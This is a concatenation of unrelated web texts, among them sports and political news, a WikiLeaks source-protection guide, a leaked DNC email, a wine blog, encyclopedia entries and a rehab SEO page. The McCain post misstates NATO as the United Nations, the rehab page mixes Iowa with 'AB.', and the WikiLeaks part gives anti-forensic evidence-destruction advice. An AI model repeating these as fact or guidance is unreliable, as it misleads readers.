One year ago, the Golden State Warriors found themselves down 3-2 to the Houston Rockets in the Western Conference Finals. Kevin Durant responded by scoring a combined 57 points in the final 2 contests to help punch a ticket to the NBA Finals (and soon after another title over the Cavaliers).
In a preview of this year’s potential conference final, the 11-year veteran will have to watch from the sidelines. The All-Star forward Kevin Durant has been ruled out against the Rockets Wednesday night after not participating in practice on Tuesday.
This was originally reported by Anthony Slater of The Athletic.
In the fourth quarter of Sunday’s loss against the lowly Phoenix Suns, Durant was looking to pass the ball in the low post and collided with Suns guard Mikal Bridges and Deandre Ayton. Durant ended up coming down awkwardly on his right ankle and immediately went to the locker room for further treatment.
Kevin Durant : 25 points on 9-17 shooting, 6-8 from the FT line & 3 assists in 30 minutes (Sprained his right ankle in the 4th quarter & didn’t return) pic.twitter.com/j7JvnXHJ9D
— Lee Harvey (@MusikFan4Life25) March 11, 2019
Durant was diagnosed with a right ankle contusion and left the court under his own power for the final 6 minutes of Golden State’s 115-111 defeat to last-place Phoenix.
Durant also twisted that same ankle earlier this month against the Philadelphia 76ers.
This will mark just the second game that Durant has missed this season. On Feb. 28 against the Orlando Magic, Durant sat out for a night of rest.
Prior to exiting the game against the Suns, Durant scored 25 points on 9-of-17 shooting in addition to dishing out three assists and recording a pair of steals. Throughout the 2018-19 season, Durant has averaged 27.5 points, 6.8 rebounds, and 5.7 assists while shooting 36.0 percent from beyond the arc.
The Rockets will be gunning for the regular-season sweep tonight. Durant produced a combined 75 points, including a team-high 29 in an overtime loss on Feb. 23. Even with the star forward compiling solid performances, Golden State hasn’t been able to get over the top.
How will the Warriors avoid the sweep tonight? It’s not looking good without one of their top scorers (and underrated defenders).
Warriors Outlook Tonight Vs. Rockets
The problem with Golden State versus Houston has been abject defense from the Warriors. They have ceded 120 points per game in the 3 meetings, which would translate to a last-place showing in the league if extrapolated out to a full season.
The Warriors need Durant’s length on defense if they want to operate at peak efficiency. Without him, there’s not much to slow the Rockets on the perimeter, which is not a good combination when facing James Harden.
Draymond Green is the best defender, and he can man up with a lot of people at the top of the key. He ranked fifth in the NBA through the All-Star break in defensive real plus-minus (at +3.76), which measures a player’s average impact on his team’s defense by points allowed per 100 possessions.
Durant ranked 157th, at +0.7 and is also tied for 26th in the league in blocked shots at 1.15 per game. He briefly led the league in blocks early in 2017-18, even generating some Defensive Player of the Year buzz.
Houston ranks No. 11 in the league in scoring offense at 113 points a game. If they were already scoring 120 a game against the Warriors with Durant, that total should skyrocket Wednesday night.
Steve Kerr will have to rely on his offense outgunning the Rockets in Houston. The first 3 contests produced 111 points per game, and switching Durant with Andre Iguodala is not necessarily the switch needed to improve there.

Rand Paul Staff Responds to John McCain — In Russian
Posted by Cassandra Fairbanks | Mar 15, 2017 |
The new darling of the Democratic Party, Senator John McCain, has accused Senator Rand Paul of “working for Vladimir Putin” after the Kentucky politician blocked consideration of a treaty to allow Montenegro into the United Nations.
“If there’s objection, you are achieving the objectives of Vladimir Putin,” McCain said when he attempted to call the treaty into consideration. “If they object, they are now carrying out the desires and ambitions of Vladimir Putin, and I do not say that lightly.”
Paul appeared, stating “I object,” then hurrying out of the room without providing any further commentary.
“That is really remarkable that a senator, blocking a treaty that is supported by the overwhelming number, perhaps 98 at least of his colleagues, would come to the floor and object, and walk away,” McCain said. “The only conclusion you can draw when he walks away is he has no argument to be made,” he said.
McCain then resorted to the same tactic that he and his pals in the Democratic Party have been using against anyone who challenges them — declaring that the senator is working for Putin.
“The senator from Kentucky is now working for Vladimir Putin,” McCain said.
Doug Stafford, Paul’s chief strategist, has responded to the allegation by tweeting out “see you in court” — in Russian.
?? ??????? ? ????
— Doug Stafford (@dougstafford) March 15, 2017
The statement was a clear violation of Rule 19, the same rule that was used to infamously shut down Senator Elizabeth Warren — causing her to be censured.
The rule clearly states that senators may not “directly or indirectly, by any form of words impute to another Senator or to other Senators any conduct or motive unworthy or unbecoming a Senator.”
In a statement provided to We Are Change, Paul asserted that, “currently, the United States has troops in dozens of countries and is actively fighting in Iraq, Syria, Libya, and Yemen (with the occasional drone strike in Pakistan).”
“In addition, the United States is pledged to defend 28 countries in NATO. It is unwise to expand the monetary and military obligations of the United States given the burden of our $20 trillion debt,” Paul’s statement concluded.
OH YEAH, since we are not corporate or government owned help us out here.

How to contact WikiLeaks? What is Tor? Tips for Sources After Submitting
Contact
If you need help using Tor you can contact WikiLeaks for assistance in setting it up using our simple webchat available at: https://wikileaks.org/talk
If you can use Tor, but need to contact WikiLeaks for other reasons use our secured webchat available at http://wlchatc3pjwpli5r.onion
We recommend contacting us over Tor if you can.
How to contact WikiLeaks? What is Tor? Tips for Sources After Submitting
Tor
Tor is an encrypted anonymising network that makes it harder to intercept internet communications, or see where communications are coming from or going to.
In order to use the WikiLeaks public submission system as detailed above you can download the Tor Browser Bundle, which is a Firefox-like browser available for Windows, Mac OS X and GNU/Linux and pre-configured to connect using the anonymising system Tor.
Tails
If you are at high risk and you have the capacity to do so, you can also access the submission system through a secure operating system called Tails. Tails is an operating system launched from a USB stick or a DVD that aim to leaves no traces when the computer is shut down after use and automatically routes your internet traffic through Tor. Tails will require you to have either a USB stick or a DVD at least 4GB big and a laptop or desktop computer.
How to contact WikiLeaks? What is Tor? Tips for Sources After Submitting
Tips
Our submission system works hard to preserve your anonymity, but we recommend you also take some of your own precautions. Please review these basic guidelines.
1. Contact us if you have specific problems
If you have a very large submission, or a submission with a complex format, or are a high-risk source, please contact us. In our experience it is always possible to find a custom solution for even the most seemingly difficult situations.
2. What computer to use
If the computer you are uploading from could subsequently be audited in an investigation, consider using a computer that is not easily tied to you. Technical users can also use Tails to help ensure you do not leave any records of your submission on the computer.
3. Do not talk about your submission to others
If you have any issues talk to WikiLeaks. We are the global experts in source protection – it is a complex field. Even those who mean well often do not have the experience or expertise to advise properly. This includes other media organisations.

1. Do not talk about your submission to others
If you have any issues talk to WikiLeaks. We are the global experts in source protection – it is a complex field. Even those who mean well often do not have the experience or expertise to advise properly. This includes other media organisations.
2. Act normal
If you are a high-risk source, avoid saying anything or doing anything after submitting which might promote suspicion. In particular, you should try to stick to your normal routine and behaviour.
3. Remove traces of your submission
If you are a high-risk source and the computer you prepared your submission on, or uploaded it from, could subsequently be audited in an investigation, we recommend that you format and dispose of the computer hard drive and any other storage media you used.
In particular, hard drives retain data after formatting which may be visible to a digital forensics team and flash media (USB sticks, memory cards and SSD drives) retain data even after a secure erasure. If you used flash media to store sensitive data, it is important to destroy the media.
If you do this and are a high-risk source you should make sure there are no traces of the clean-up, since such traces themselves may draw suspicion.
4. If you face legal action
If a legal action is brought against you as a result of your submission, there are organisations that may help you. The Courage Foundation is an international organisation dedicated to the protection of journalistic sources. You can find more details at https://www.couragefound.org.
Submit documents to WikiLeaks
WikiLeaks publishes documents of political or historical importance that are censored or otherwise suppressed. We specialise in strategic global publishing and large archives.
The following is the address of our secure site where you can anonymously upload your documents to WikiLeaks editors. You can only access this submissions system through Tor. (See our Tor tab for more information.) We also advise you to read our tips for sources before submitting.
wlupld3ptjvsgwqw.onion
Copy this address into your Tor browser. Advanced users, if they wish, can also add a further layer of encryption to their submission using our public PGP key.
If you cannot use Tor, or your submission is very large, or you have specific requirements, WikiLeaks provides several alternative methods. Contact us to discuss how to proceed.

RE: Bernie Sanders Supporters Voice Ire at Nevada Democratic Party - NYTimes.com
From:GarciaW@dnc.org To: MirandaL@dnc.org, TaylorP@dnc.org, PaustenbachM@dnc.org, amellody@demconvention.com, DaceyA@dnc.org, FedericoC@dnc.org more WalkerE@dnc.org, alvillarr@dnc.org, KhanA@dnc.org Date: 2016-05-16 21:29 Subject: RE: Bernie Sanders Supporters Voice Ire at Nevada Democratic Party - NYTimes.com
Also, flagging that the top political reporter in Nevada, Jon Ralston, published an article not so long ago in which he highlighted the fact that the NV Convention doesn't bode well for our Convention in July. Definitely something we should bear in mind going forward. https://www.ralstonreports.com/blog/sour-grapes-revolution-rocked-paris-hotel?mc_cid=03ad046294&mc_eid=b3f6d44b0b If what happens in Vegas happens in Philadelphia, the chances of a unified Democratic Party in the general election are virtually nonexistent and the odds of a President Trump suddenly don't look so long. ... Clinton has a difficult needle-threading job keeping the Sanders voters in the tent as she moves towards November. But if Sanders does not soon disavow what his team here has overseen - and even the senator may not be able to douse the wildfire he lit - there is no reason to believe that what happened at the Paris in May will not happen at the Wells Fargo Center in July. From: Miranda, Luis Sent: Monday, May 16, 2016 7:22 PM To: Garcia, Walter; Patrice Taylor; Paustenbach, Mark; April Mellody; Dacey, Amy; Federico, Courtney; Walker, Eric; Alvillar, Raul; Khan, Ali Subject: FW: Bernie Sanders Supporters Voice Ire at Nevada Democratic Party - NYTimes.com NYT is out with a story. We expect to see a letter from the State Party shortly that is submitted to the Chairs of the Rules & Bylaws committee, but that doesn't ask anything of the DNC, just to register their concerns about the behavior coming from some of the supporters, including death threats. Will circulate as soon as we have it. http://mobile.nytimes.com/2016/05/17/us/politics/bernie-sanders-supporters-nevada.html?_r=0&referer=https://www.google.com/

Also, flagging that the top political reporter in Nevada, Jon Ralston, published an article not so long ago in which he highlighted the fact that the NV Convention doesn't bode well for our Convention in July. Definitely something we should bear in mind going forward.

If what happens in Vegas happens in Philadelphia, the chances of a unified Democratic Party in the general election are virtually nonexistent and the odds of a President Trump suddenly don't look so long.

...

Clinton has a difficult needle-threading job keeping the Sanders voters in the tent as she moves towards November. But if Sanders does not soon disavow what his team here has overseen - and even the senator may not be able to douse the wildfire he lit - there is no reason to believe that what happened at the Paris in May will not happen at the Wells Fargo Center in July.

NYT is out with a story. We expect to see a letter from the State Party shortly that is submitted to the Chairs of the Rules & Bylaws committee, but that doesn't ask anything of the DNC, just to register their concerns about the behavior coming from some of the supporters, including death threats. Will circulate as soon as we have it.

Groot Expectations: South Africa Wine Report
March 18, 2014 By Mike Veseth in extreme wine, South Africa	3 Comments
South African wine is not as well known as it should be (and soon will be) here in the United States, which is both surprising and not. You might think that South Africa would have a higher profile given its long history and large wine production, for example.
Cape winemakers produced about 10 percent less wine than Chile in recent years, about 10 percent more than Germany and about four times (!) the total wine production of New Zealand (according to OIV statistics).
That, my friends, is a lot of wine. Given those figures and how ubiquitous Kiwi, German and Chilean wines are, you might expect to see a South African wine on every shelf or nearly so.
South Africa Surprises
But numbers aren’t everything in this case. South Africa produces a lot of wine and much of it is consumed at home or shipped off to Europe, the traditional export market for more than three hundred years.
The lack of a strong presence in the U.S. market is due to this and to other factors. The South Africans like to say that Americans don’t seem to know very much about geography and I think this is true although not exclusively a Yankee trait.
Some Americans are surprised to learn that South Africa is a country and not a region, for example, but even my friends who follow soccer and therefore know that South Africa is the country that hosted the 2010 World Cup are often surprised to learn about South African wine.
The Invisible Wine
Ignorance is therefore one reason why South African wines are not better known but there are others. South Africa reentered the global wine market in the 1990s, which in retrospect was a critical moment for the world of wine. Australia, New Zealand, Chile and Argentina all had “coming out” parties within the span of a few years. It wasn’t always easy to get noticed with so much new wine on offer.
Easy to get lost or forgotten — ask Bulgaria, which had previously had an important presence in UK supermarkets! South African wines were among the replacements in the UK, but had less success in the US market, which is structurally difficult to penetrate and hotly contested by both domestic and international firms. Add to that logistics issues and some early problems with consistent quality and you can begin to see why South Africa got off to a slow start.
But times have changed and Sue and I wanted to see how South Africa was changing, so we flew to Cape Town where I gave the keynote speed at the NedBank VinPro Information Day program, a meeting of more than 500 wine industry leaders, and tried to learn as much as we could in a short (three week) period of time.
Intense and Extreme
It was quite an intense (and extreme) experience as we visited 30 wineries, talking with owners, winemakers and export and marketing executives. I will paste the list of wineries at the end of this post to give you some idea of who we met and where we went. This was Sue’s first visit; I was here in 2012 to open the Nederburg Auction (click here to read about that visit and to see all the columns about South Africa).
A lot has changed in just a short period of time and I will be writing about what I learned in the next few Wine Economist columns. Perhaps the biggest change I found was in a clearer sense of direction.
When I visited two years ago many winemakers knew that they needed to explore new paths (entering or reentering the US market was the most common topic of conversation but perhaps that’s because of my American roots), but when and how were usually questions without answers. They had some idea of what had not worked in the past, but no clear sense of what to do differently this time.
Great Expectations
Fast forward to our many conversations this year and the change is dramatic. Many perhaps most know what they want to achieve and they have developed clear strategies to get them there. The plans are not all the same (nor should they be) and they probably won’t all succeed (that’s the wine business for you), but there is a certain confidence as they put their best feet forward. We were impressed!
Next week I will tell you more about our reasons for optimism about South African wine. And then, since I am an economist, some necessarily dismal science perspectives since wine is such a difficult game and dark clouds and silver linings are difficult to separate.
Finally, we want to tell you about a few of the extreme wine people we met on this trip. Wine is a people business as most of you already know and it is the people of South African wine who are the greatest reason to be optimistic about its future.

I recall living in Greenwich ST in themed ’80s and seeing SA wines being closed out by shops for political reasons. Considering the time it takes to gain the “15 minutes” in the USA market, this must have been a setback for them (although it seems a long time ago…)

Brand
A brand (or marque for car model) is a name, term, design, symbol or other feature that distinguishes one seller's product from those of others. Brands are used in business, marketing, and advertising. Initially, livestock branding was adopted to differentiate one person's cattle from another's by means of a distinctive symbol burned into the animal's skin with a hot branding iron.
In accounting, a brand defined as an intangible asset is often the most valuable asset on a corporation's balance sheet. Brand owners manage their brands carefully to create shareholder value, and brand valuation is an important management technique that ascribes a money value to a brand, and allows marketing investment to be managed (e.g.: prioritized across a portfolio of brands) to maximize shareholder value. Although only acquired brands appear on a company's balance sheet, the notion of putting a value on a brand forces marketing leaders to be focused on long term stewardship of the brand and managing for value.

Brand (surname)
Brand is a surname. It usually is a patronymic from the Germanic personal name Brando (="sword") or a short form of a compound personal name like Hildebrand. The surname originated separately in England, Scotland, Scandinavia, the Netherlands, and North Germany. Also many Scandinavian Brand's immigrated across Scandinavia and Europe. Notable people with the surname include:
Adam Brand (born 1970), Australian country music singer
Adolf Brand, (1874–1945), German activist for homosexual rights
Alexander Brand (born 1977), Colombian boxer
Andrea Brand (born 1950s), American molecular biology professor at the University of Cambridge

List of The Belgariad and The Malloreon characters
This is a list of The Belgariad and The Malloreon characters. The Belgariad and The Malloreon are two parts of a fantasy epic written by David Eddings. Note: All of the statements (deceased, married) are written from the current information by the end of the series.
Protagonists
Note: These characters are the main protagonists to the story. There are many other minor and supporting protagonists, including some royalty.
Garion (later Belgarion), the main protagonist of the story and later the King of Riva, with the titles of Overlord of the West, Lord of the Western Sea, and Godslayer. Husband of Ce'Nedra, father of Geran and Beldaran (named after Polgara's dead sister). Garion is called the "Child of Light" in the Mrin Codex and the Darine Codex. (Note: he is not the only Child of Light; that is a position passed from individual to individual. At one point it is Belgarath; at another, Poledra; and finally, Eriond.)
Belgarath the Sorcerer, first disciple of the god Aldur and husband of Poledra. Ancestor and mentor of Belgarion. Belgarath is called the "Eternal Man", "Ancient One", and "Eternal and Beloved" in the Mrin Codex. One of the first users of the Will and the Word (a form of psychokinesis).

How To Build
i find people sicknowadays are unaware of what we are
un/able to stomach.
never discover appetites altered genetic.
media garnish so photogenic;
this can't be nutritious.
lately i know people to be sick.
because discovery of sustenance substitutes does not
create a panic.
disguised as a progression only a science knows,
the sick do not care:
where their money goes;
into what hands their faith lands,
into what insant cure they can purchase.
this mouse trap built facilitates its builder's station.
this mouse trap makes me feel sad
and frames a future hollow.
knee jerk? tear jerk?
cold hearts couldn't care less.
this is not taken seriously
this does not hurt me
what hurts me is when you swallow anything i woul dnot.
sum it up in all one pill.
because seeds for next harvest have proven to be sterile.
sum it up in all one pill.
Brand
A brand (or marque for car model) is a name, term, design, symbol or other feature that distinguishes one seller's product from those of others. Brands are used in business, marketing, and advertising. Initially, livestock branding was adopted to differentiate one person's cattle from another's by means of a distinctive symbol burned into the animal's skin with a hot branding iron.
In accounting, a brand defined as an intangible asset is often the most valuable asset on a corporation's balance sheet. Brand owners manage their brands carefully to create shareholder value, and brand valuation is an important management technique that ascribes a money value to a brand, and allows marketing investment to be managed (e.g.: prioritized across a portfolio of brands) to maximize shareholder value. Although only acquired brands appear on a company's balance sheet, the notion of putting a value on a brand forces marketing leaders to be focused on long term stewardship of the brand and managing for value.

'Mission Accomplished' in Syria, Trump declares on Twitter
Posted: 7:06 AM, Apr 14, 2018
Updated: 2018-04-14 14:06:24Z
By: ROBERT BURNS, JILL COLVIN and ZEKE MILLER , Associated Press
WASHINGTON (AP) — Allied missiles struck at the heart of Syrian chemical weapons arsenal in a show of force and resolve aimed at punishing the Assad government for a suspected poison gas attack against civilians and deterring the possible future use of such banned weapons.
"A perfectly executed strike," President Donald Trump tweeted Saturday in the aftermath of his second decision in two years to fire missiles against Syria. "Could not have had a better result. Mission Accomplished!"
His choice of words recalled a similar claim associated with President George W. Bush following the U.S.-led invasion of Iraq. Bush addressed sailors aboard a ship in May 2003 alongside a "Mission Accomplished" banner, just weeks before it became apparent that Iraqis had organized an insurgency that tied down U.S. forces for years.
Syria's chief allies, Russia and Iran, called the use of force by the United States, Britain and France a "military crime" and "act of aggression" with the potential to worsen a humanitarian crisis after years of civil war. The U.N. Security Council planned to meet later Saturday at Moscow's request.
"Good souls will not be humiliated," Syrian President Bashar Assad tweeted, while hundreds of Syrians gathered in Damascus, the capital, where they flashed victory signs and waved flags in scenes of defiance after the one-hour barrage launched Friday evening (early Saturday in Syria).
The strikes "successfully hit every target," Pentagon spokeswoman Dana White said at a briefing Saturday, disputing the Russian military's contention that Syrian air defense units downed 71 out of 103 cruise missiles fired by the allies.
Lt. Gen. Kenneth McKenzie, the director of the Joint Staff at the Pentagon, said no aircraft or missiles involved in the operation "were successfully engaged by Syrian air defenses." He said 105 weapons were launched against three targets, and that the U.S. was not aware of any civilian casualties.
A global chemical warfare watchdog group said its fact-finding mission would go as planned in Douma, where the apparent use of poison gas against civilians on April 7 that killed more than 40 people compelled the Western allies to launch their attack. Syria has denied the accusation.
But France's foreign minister said there was "no doubt" the Assad government was responsible, and he threatened further retaliatory strikes if chemical weapons were used again, as did Pentagon chief Jim Mattis, who said the assault was a "one-time shot," as long as chemical weapons weren't used again.
NATO representatives planned a special session to hear from U.S., British and French officials.
Pentagon officials said the attacks, carried out by manned aircraft and from ships that launched cruise missiles from the Mediterranean Sea, targeted the heart of Assad's programs to develop and produce chemical weapons, and delivered "a very serious blow," said McKenzie.
Trump said the U.S. was prepared to sustain economic, diplomatic and military pressure on Assad until he ends what Trump called a criminal pattern of killing his own people with internationally banned chemical weapons. That did not mean military strikes would continue; in fact, Gen. Joseph Dunford, chairman of the Joint Chiefs of Staff, said no additional attacks were currently planned.
Russian leader Vladimir Putin reaffirmed the Kremlin's skepticism about the allies' Douma claim, saying Russian military experts had found no trace of the attack. He criticized the U.S. and its allies for launching the strike without waiting for international inspectors to visit the area.
But British Prime Minister Theresa May cited reports she said indicated the Syrian government used a barrel bomb — large containers packed with fuel, explosives and scraps of metal — to deliver the chemicals. "No other group" could have carried out that attack, she said, adding that the allies' use of force was "right and legal."
German Chancellor Angela Merkel said the West's response was "necessary and appropriate."
Mattis disclosed that the U.S. had not yet confirmed that the Douma attack -- the most recent suspected Syrian chemical weapons attack, on April 7 -- included the use of sarin gas. He said at least one chemical was used — chlorine, which also has legitimate industrial uses and had not previously triggered a U.S. military response.
He said the targets selected by U.S., British and French officials were meant to minimize civilian casualties.
"This is difficult to do in a situation like this," he said, in light of the volatility of chemical agents.
Defense officials from the countries involved in the attack gave differing accounts of how much warning was given to the Russians, Syria's powerful ally.
Dunford said the U.S. did not coordinate targets with or notify the Russian government of the strikes, beyond normal airspace "de-confliction" communications. But the description from an ally put things differently. French Defense Minister Florence Parly said that "with our allies, we ensured that the Russians were warned ahead of time."
At a Pentagon news conference alongside Mattis, and with British and French military officers beside them to emphasize allied unity, Dunford said the attacks targeted mainly three targets in western Syria.
Dunford said missiles first struck a scientific research center in the Damascus area that he said was a center of Syrian research, development, production and testing of chemical and biological warfare technology. The second target was a chemical weapons storage facility west of Homs. He said this was believed to be the main site of Syrian sarin and precursor chemical production equipment.
The third target was a chemical weapons equipment storage facility and an important command post, also west of Homs, Dunford said.
British leader May said in London that the West had tried "every possible" diplomatic means to stop Assad from using chemical weapons. "But our efforts have been repeatedly thwarted" by Syria and Russia, she said.
"So there is no practicable alternative to the use of force to degrade and deter the use of chemical weapons by the Syrian regime," May said. "This is not about intervening in a civil war. It is not about regime change."
French President Emmanuel Macron said in a statement that a target of the strike was the Syrian government's "clandestine chemical arsenal."
The Syrian government has repeatedly denied any use of banned weapons.
The decision to strike, after days of deliberations, marked Trump's second order to attack Syria. He authorized a barrage of Tomahawk cruise missiles to hit a single Syrian airfield in April 2017 in retaliation for Assad's use of sarin gas against civilians.
Trump chastised Russia and Iran for supporting "murderous dictators," and noted that Putin had guaranteed a 2013 international agreement for Assad to get rid of all of his chemical weapons.
White, the Defense Department spokeswoman, said the strikes did not "represent a change in U.S. policy or an attempt to depose the Syrian regime." But, she said, "We cannot allow such grievous violations of international law."

Perth teacher who dubbed student 'ponytail princess' has registration cancelled
By Garrett Mundy
Updated October 31, 2017 01:16:49

Map: Ellenbrook 6069
A Perth private school teacher has had his registration cancelled after admitting to serious misconduct in his dealings with a student in his care.
The State Administrative Tribunal (SAT) had been investigating the 55-year-old after his school received a complaint from a parent in March this year.
It was alleged the teacher had been giving preferential treatment to a 15-year-old female student in his pastoral care group.
The behaviour included routinely giving the teenager money for lunch, and discussing his wife's breast cancer treatment plan with the girl.
He also emailed the Year 10 student from his private email address on Valentine's Day this year, purportedly to check on the girl who he had seen crying outside the classroom the day before.
The teacher was not working at the school on the day he emailed the girl.
The SAT also heard the teacher went to the girl's workplace in early March, where he gave her a card containing $20, a hand-written note including his phone number, and referred to the girl as "the ponytail princess".
The girl showed the note to her stepmother, who contacted the school days later.
The teacher was dismissed late in March, but contacted another student on Facebook in April with the intent to see any comments made by the 15-year-old girl or about her.
In his submission to the SAT, the 55-year-old acknowledged his behaviour had been inappropriate for his role, but said he was not aware of the girl's discomfort with his actions.
"I would not have confided in her regarding my wife's illness, nor given her a thank you card, if I had knowledge of her discomfort," he said.

Drug Rehab and Treatment Centers Information La Motte, Iowa
Looking for Drug Rehab and treatment centers in La Motte, Iowa?
There are several alcohol and drug treatment facilities possibilities to people residing in the La Motte region. You should recognize each of the types of treatment choices that are offered in La Motte, AB., in order to select the suitable rehab option for yourself or a family member. Selecting the proper drug treatment center in La Motte is the central element in the treatment of substance abuse, drug addiction and alcoholism. The following information will help ensure you fully grasp your numerous treatment possibilities so that you have the greatest potential for an effective end result.
Let's take a look at the different drug treatment facilities in La Motte, Iowa options that correlate with the circumstances of the individual seeking rehab.
Inpatient alcohol and drug treatment in La Motte, AB. can be a treatment choice best for many who require medical treatment during treatment or clients with substantial substance abuse histories. Women and men can develop mental and physical dependence to drugs and alcohol even after a brief amount of time, so inpatient drug rehab in La Motte is regarded as the most reliable rehab choice in almost all scenarios. As a result of dependence and addiction, women and men will most likely struggle to make a full recovery with the minimal solutions offered by outpatient treatment centers in La Motte, Iowa where drugs and alcohol continue to be easily obtainable when they depart the outpatient facility. Likewise, individuals in rehabilitation who take part in outpatient rehab rather than inpatient drug and alcohol rehab in La Motte continue to be prone to negative relationships and situations which might compromise their process of recovery. When someone resides with an abusive companion or maintains relationships that entail abusing drugs, any treatment endeavours in outpatient treatment will be in vain. This is the reason in-patient alcohol and drug rehab in La Motte, AB. will result in more beneficial results that will prove long lasting in contrast to an outpatient drug and alcohol rehabilitation program where benefits are often very limited and short-lived.
In La Motte there's both short-term and long-term inpatient alcohol and drug rehab. Short-term is a 30-day center, while long-term inpatient drug and alcohol treatment in La Motte, Iowa is significantly more in depth and treatment can last 3 to 6 months on average. This is an ideal setting for clients since it is a safe and secure drug free setting where they are able to recover both mentally and physically without distraction. Ideally, women and men will continue within a long-term in-patient drug and alcohol rehabilitation facility in La Motte for the maximum time period allowed, so that they can deal with anything which can cut across their sobriety once they leave rehab. Due to the fact detoxing and becoming physically stabilized can require a couple weeks by itself, the three to six months in long-term in-patient drug treatment in La Motte is going to be time spent well and a lot more efficient than short-term programs.
The most important aspect of all if you or a loved one is struggling with a drug abuse or addiction problem is to do something about it, make calls and seek advice from skilled addiction professionals and have an assessment and treatment possibilities to ensure the best chance for a recovery.

Addiction Facts
Underage drinkers were more likely than persons aged 21 or older to use illicit drugs within 2 hours of alcohol use on their last reported drinking occasion (17.4 vs. 4.6 percent, respectively). The most commonly reported illicit drug used by underage drinkers in combination with alcohol was marijuana, which was used within 2 hours of alcohol use by 16.5 percent of current underage drinkers (1.6 million persons) on their last drinking occasion.
The rate of current use of any tobacco product among persons aged 12 or older remained steady from 2007 to 2008 (28.6 and 28.4 percent, respectively). Rates of current use of cigarettes, smokeless tobacco, cigars, and pipe tobacco also did not change significantly over that period. However, between 2002 and 2008, past month use of any tobacco product decreased from 30.4 to 28.4 percent, and past month cigarette use declined from 26.0 to 23.9 percent. Rates of past month use of cigars, smokeless tobacco, and pipe tobacco in 2008 were similar to corresponding rates in 2002.
Between 2008 and 2009, the rate of current use of illicit drugs among young adults aged 18 to 25 increased from 19.6 to 21.2 percent, driven largely by an increase in marijuana use (from 16.5 to 18.1 percent).

OAS CAHPS Survey - SPH Analytics
OAS CAHPS Survey®
Provided by SPH Analytics, an ASCA Affinity Partner
After a comprehensive evaluation of survey providers for the new Outpatient and Ambulatory Surgery Consumer Assessment of Healthcare Providers and Systems (OAS CAHPS®) Survey, ASCA has formed an affinity partnership with SPH Analytics because of their extensive survey expertise and history of working with ASCA members to measure performance and drive process improvement.
To further benefit our members, we have negotiated with this company to offer special discounted OAS CAHPS rates that include complete survey administration, submission and innovative dashboard analytics. These rates are available to ASCA members only.
The OAS CAHPS Survey is designed to measure patient experience with overall care received in Medicare-certified ambulatory surgery centers (ASCs) and hospital outpatient departments (HOPDs). When this program becomes mandatory, all CMS-certified ASCs that are required to submit quality data will need to contract with a CMS-approved survey vendor to comply with the ASC Quality Reporting Program.*
Although the OAS CAHPS survey is currently voluntary, ASCs can begin conducting it prior to the anticipated CMS mandates in order to:
Know where you stand before mandatory reporting begins
Begin service recovery and take action to address identified issues for improved survey results
Understand your patients’ perceptions and make changes to increase overall satisfaction
Drive performance improvement for increased ratings on health care consumer web sites
Get Started with the Survey Now
If you are an ASCA member, you must log in below to take advantage of the special discounted rates.

Not an ASCA member? Call 877.208.7605 and select Option 2 for a free consultation with SPH Analytics.
OAS CAHPS Survey Information
What does the OAS CAHPS Survey measure?
The survey includes 24 questions plus patient demographic information (37 questions total). It encompasses the following domains:
Communication and care provided by health care providers and office staff
Preparation for the surgery or procedure
Post-surgical care coordination and patient-reported outcomes
Overall rating of the ASC or HOPD
Whether the patient would recommend the facility to family and friends
What are the goals of the OAS CAHPS Survey?
The goals of the survey are to:
Produce comparative data on the patient’s perspective to allow objective and meaningful comparisons between ASCs and HOPDs on domains that are important to consumers
Provide a platform for public reporting to allow consumers to make more informed choices when choosing an ASC or HOPD
Assess post-surgical care coordination and patient-reported outcomes
Empower ASCs to use the data reported for implementing quality improvement initiatives
How is the OAS CAHPS Survey administered?
SPH Analytics and other CMS-approved OAS CAHPS Survey vendors administer the survey on behalf of ASCs and HOPDs and submit the data to RTI International. The survey is administered by phone, mail or mixed mode (mail with phone follow-up). There is no Web-based version of the survey. Highlights of the survey administration include:
Target minimum of 300 completed survey over each 12-month reporting period
Must attempt to contact every patient in the sample
Proxies are not permitted
More information about the OAS CAHPS Survey is available here.

Good morning ... In a world where "Phantom Thread" is so criminally overlooked, this newsletter author still finds the silver lining: Roger Deakins and Jordan Peele winning well-deserved Oscars.
Health industry’s tax savings aren't benefiting patients
Illustration: Sarah Grillo / Axios
Health care companies will add tens of billions of dollars to their bottom lines this year thanks to savings from the Republican tax cut package. But only a tiny fraction of that money will benefit patients.
The details: My colleagues Bob Herman and Caitlin Owens dug through financial reports from 21 publicly traded health care companies. Collectively, those companies expect to gain $10 billion in tax savings in 2018 alone.
Most of the money is going toward share buybacks, dividends, acquisitions and paying down debt — with just a sliver for one-time employee bonuses, research and internal investments.
This is a conservative analysis, because it only includes companies that provided a specific breakdown of the savings they can attribute to the new tax law. But plenty of other big industry names have also made clear they’re using most of their tax windfall to pay down debt or buy back their own stock.
The bottom line: "Companies lower prices on shoes, phones, cars (comparatively or versus inflation) to get your business. Health care pricing doesn't work that way. So the natural pressure to use the tax code to lower pricing ... isn't there in health care," says Rodney Whitlock, a former GOP health policy aide.
Go deeper: Read Bob and Caitlin’s full analysis on Axios.com.

The next big thing to watch on Medicaid
Gov. Asa Hutchinson speaks at the 2016 Republican National Convention. Photo: Alex Wong / Getty Images
Keep an eye on Arkansas today for some big indications of just how far the federal government is willing to let states go in tightening access to Medicaid. Seema Verma, who runs the federal Medicaid program, will be at the statehouse this morning alongside Gov. Asa Hutchinson.
What to watch: Verma is expected to announce that Arkansas will be allowed to add work requirements to its Medicaid program. That’s not a huge surprise — she’s already approved work requirements in two other states.
But Arkansas has asked for more than just work requirements. The state also wants to roll back its participation in the Affordable Care Act’s Medicaid expansion.
The ACA offered states a lot of extra federal funding if they expanded Medicaid eligibility to people making up to 138% of the federal poverty limit. Arkansas wants to keep the federal funding, but drop eligibility down to 100% of the poverty limit.
State officials have said that change would bump about 60,000 people off the program, according to Arkansas Online.
Threat level: Signing off on the lower eligibility threshold would push the limits of the administration’s legal authority on two fronts. These Medicaid waivers are supposed to further the goals of the Medicaid program, and the 138% eligibility level is written into federal law.
At the same time, it would send an even stronger message to red states that almost nothing is off the table in the campaign to chip away at the ACA.

Actuaries say Idaho's ACA plan would wreck the market
The American Academy of Actuaries has weighed in to support the near-unanimous expert consensus against Idaho's move to let insurance companies sell policies that don't comply with the ACA.
Key quote: "Although offering state-based plans that can avoid ACA issue, rating, and benefit rules could provide lower-cost health insurance options to many Idaho residents, such options would lead to a deterioration of the state’s ACA market. As a result, ACA premiums would increase, and options for individuals with pre-existing conditions would narrow."

New questions about surgery centers' safety
